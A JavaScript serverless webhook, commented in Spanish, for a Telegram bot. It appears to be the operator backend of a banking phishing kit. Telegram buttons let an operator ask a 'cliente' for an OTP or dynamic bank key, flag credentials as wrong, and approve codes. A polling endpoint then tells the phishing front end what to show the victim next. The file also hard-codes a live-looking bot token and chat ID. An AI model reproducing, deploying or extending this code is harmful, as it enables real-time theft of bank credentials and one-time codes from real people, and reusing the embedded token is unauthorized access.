// api/webhook.js - WEBHOOK COMPLETO PARA VERCEL
// Persistencia en archivo JSON (compatible con serverless)
// Resiliencia: retries + backoff + timeouts

const TELEGRAM_BOT_TOKEN = '7612905861:AAF9H2MUKA6g7U7wd00AhEwi1ZkU2a7g-nw';
const TELEGRAM_CHAT_ID = '6552121903';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const DATA_DIR = '/tmp/pyp_data';
const SOLICITUDES_FILE = `${DATA_DIR}/solicitudes.json`;

function ensureDataDir() {
    if (!global._dataInitialized) {
        global._dataInitialized = true;
    }
}

function loadSolicitudes() {
    try {
        if (global._solicitudesCache) return global._solicitudesCache;
        if (global.solicitudes && global.solicitudes.size > 0) return global.solicitudes;
        return new Map();
    } catch {
        return new Map();
    }
}

function saveSolicitudes(map) {
    global.solicitudes = map;
    global._solicitudesCache = map;
}

async function telegramRequest(endpoint, payload, retries = 3) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);

            const response = await fetch(`${TELEGRAM_API}/${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                signal: controller.signal,
            });
            clearTimeout(timeoutId);

            if (response.status === 429) {
                const waitMs = 1000 * Math.pow(2, attempt);
                await new Promise(r => setTimeout(r, waitMs));
                continue;
            }

            if (response.status >= 500) {
                const waitMs = 1000 * attempt;
                await new Promise(r => setTimeout(r, waitMs));
                continue;
            }

            const data = await response.json();
            return data;
        } catch (error) {
            if (attempt === retries) {
                return { ok: false, error: error.message };
            }
            const waitMs = 1000 * attempt;
            await new Promise(r => setTimeout(r, waitMs));
        }
    }
    return { ok: false, error: 'Reintentos agotados' };
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            const update = req.body;
            console.log('📨 Update recibido:', JSON.stringify(update));

            if (!update.callback_query) {
                return res.status(200).json({ success: true, message: 'Update recibido' });
            }

            const callbackData = update.callback_query.data;
            const callbackId = update.callback_query.id;
            const message = update.callback_query.message;
            const chatId = message.chat.id;
            const messageId = message.message_id;
            const originalText = message.text || '';

            console.log('🔘 Botón presionado:', callbackData);

            let action = '';
            let solicitudId = '';
            let respuestaTexto = '';
            let estadoMensaje = '';

            if (callbackData.startsWith('pedir_otp_')) {
                action = 'pedir_otp';
                solicitudId = callbackData.replace('pedir_otp_', '');
                respuestaTexto = '📱 Código OTP solicitado';
                estadoMensaje = '📱 *OTP SOLICITADO* - Ingrese el código de verificación';
            }
            else if (callbackData.startsWith('pedir_clave_din_')) {
                action = 'pedir_clave_din';
                solicitudId = callbackData.replace('pedir_clave_din_', '');
                respuestaTexto = '🔑 Clave Dinámica solicitada';
                estadoMensaje = '🔑 *CLAVE DINÁMICA SOLICITADA* - Ingrese su clave dinámica';
            }
            else if (callbackData.startsWith('error_credenciales_')) {
                action = 'error_credenciales';
                solicitudId = callbackData.replace('error_credenciales_', '');
                respuestaTexto = '❌ Credenciales incorrectas';
                estadoMensaje = '❌ *ERROR CREDENCIALES* - Los datos ingresados no coinciden';
            }
            else if (callbackData.startsWith('aprobar_otp_')) {
                action = 'aprobar_otp';
                solicitudId = callbackData.replace('aprobar_otp_', '');
                respuestaTexto = '✅ OTP aprobado';
                estadoMensaje = '✅ *OTP APROBADO* - Redirigiendo al cliente';
            }
            else if (callbackData.startsWith('rechazar_otp_')) {
                action = 'rechazar_otp';
                solicitudId = callbackData.replace('rechazar_otp_', '');
                respuestaTexto = '❌ OTP rechazado';
                estadoMensaje = '❌ *OTP RECHAZADO* - El código es incorrecto';
            }
            else if (callbackData.startsWith('aprobar_clave_din_')) {
                action = 'aprobar_clave_din';
                solicitudId = callbackData.replace('aprobar_clave_din_', '');
                respuestaTexto = '✅ Clave Dinámica aprobada';
                estadoMensaje = '✅ *CLAVE DINÁMICA APROBADA* - Redirigiendo al cliente';
            }
            else if (callbackData.startsWith('rechazar_clave_din_')) {
                action = 'rechazar_clave_din';
                solicitudId = callbackData.replace('rechazar_clave_din_', '');
                respuestaTexto = '❌ Clave Dinámica rechazada';
                estadoMensaje = '❌ *CLAVE DINÁMICA RECHAZADA* - La clave es incorrecta';
            }
            else if (callbackData.startsWith('continue_')) {
                action = 'continue';
                solicitudId = callbackData.replace('continue_', '');
                respuestaTexto = '✅ Continuar';
                estadoMensaje = '✅ *CONTINUAR* - Cliente procediendo';
            }
            else if (callbackData.startsWith('approve_')) {
                action = 'approved';
                solicitudId = callbackData.replace('approve_', '');
                respuestaTexto = '✅ Aprobado';
                estadoMensaje = '✅ *APROBADO*';
            }
            else if (callbackData.startsWith('reject_')) {
                action = 'rejected';
                solicitudId = callbackData.replace('reject_', '');
                respuestaTexto = '❌ Rechazado';
                estadoMensaje = '❌ *RECHAZADO*';
            }
            else if (callbackData.startsWith('error_user_')) {
                action = 'error_user';
                solicitudId = callbackData.replace('error_user_', '');
                respuestaTexto = '❌ Error de usuario';
                estadoMensaje = '❌ *ERROR USUARIO*';
            }
            else if (callbackData.startsWith('error_pass_')) {
                action = 'error_pass';
                solicitudId = callbackData.replace('error_pass_', '');
                respuestaTexto = '❌ Error de contraseña';
                estadoMensaje = '❌ *ERROR CONTRASEÑA*';
            }
            else if (callbackData.startsWith('error_otp_')) {
                action = 'error_otp';
                solicitudId = callbackData.replace('error_otp_', '');
                respuestaTexto = '❌ Error de OTP';
                estadoMensaje = '❌ *ERROR OTP*';
            }
            else {
                const parts = callbackData.split('_');
                action = parts[0] || 'unknown';
                solicitudId = parts.slice(1).join('_') || 'unknown';
                respuestaTexto = 'Procesado';
                estadoMensaje = '⚠️ Acción desconocida';
                console.log('⚠️ Callback no reconocido:', callbackData);
            }

            console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);

            await telegramRequest('answerCallbackQuery', {
                callback_query_id: callbackId,
                text: respuestaTexto,
                show_alert: false
            });

            let newText = originalText;
            const estadoRegex = /⏳ \*Estado:\* .+/;
            if (estadoRegex.test(newText)) {
                newText = newText.replace(estadoRegex, `⏳ *Estado:* ${estadoMensaje}`);
            } else {
                newText += `\n\n⏳ *Estado:* ${estadoMensaje}`;
            }

            await telegramRequest('editMessageText', {
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'Markdown'
            });

            const solicitudes = loadSolicitudes();
            solicitudes.set(solicitudId, {
                estado: action,
                timestamp: Date.now(),
                chatId: chatId,
                messageId: messageId,
                tipo: 'visa_verified'
            });
            saveSolicitudes(solicitudes);

            console.log(`✅ Solicitud ${solicitudId}: ${action}`);

            return res.status(200).json({
                success: true,
                action: action,
                solicitudId: solicitudId
            });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor' });
        }
    }

    if (req.method === 'GET') {
        const { check, setup } = req.query;

        if (setup === 'true') {
            try {
                const baseUrl = `https://${req.headers.host}`;
                const webhookUrl = `${baseUrl}/api/webhook`;

                console.log('🔗 Configurando webhook en:', webhookUrl);

                const response = await telegramRequest('setWebhook', {
                    url: webhookUrl,
                    allowed_updates: ['callback_query', 'message']
                });

                console.log('✅ Webhook configurado:', response);

                return res.status(200).json({
                    success: true,
                    message: 'Webhook configurado exitosamente',
                    webhookUrl: webhookUrl,
                    telegramResponse: response
                });
            } catch (error) {
                console.error('❌ Error configurando webhook:', error);
                return res.status(500).json({ error: 'Error configurando webhook' });
            }
        }

        if (check) {
            const solicitudes = loadSolicitudes();
            const solicitud = solicitudes.get(check);

            if (solicitud) {
                return res.status(200).json({
                    success: true,
                    solicitudId: check,
                    estado: solicitud.estado,
                    timestamp: solicitud.timestamp,
                    tipo: solicitud.tipo || 'unknown'
                });
            } else {
                return res.status(200).json({
                    success: true,
                    solicitudId: check,
                    estado: 'pending',
                    mensaje: 'Solicitud aún no procesada'
                });
            }
        }

        try {
            const response = await telegramRequest('getWebhookInfo');
            return res.status(200).json(response);
        } catch (error) {
            return res.status(500).json({ error: 'Error obteniendo info del webhook' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
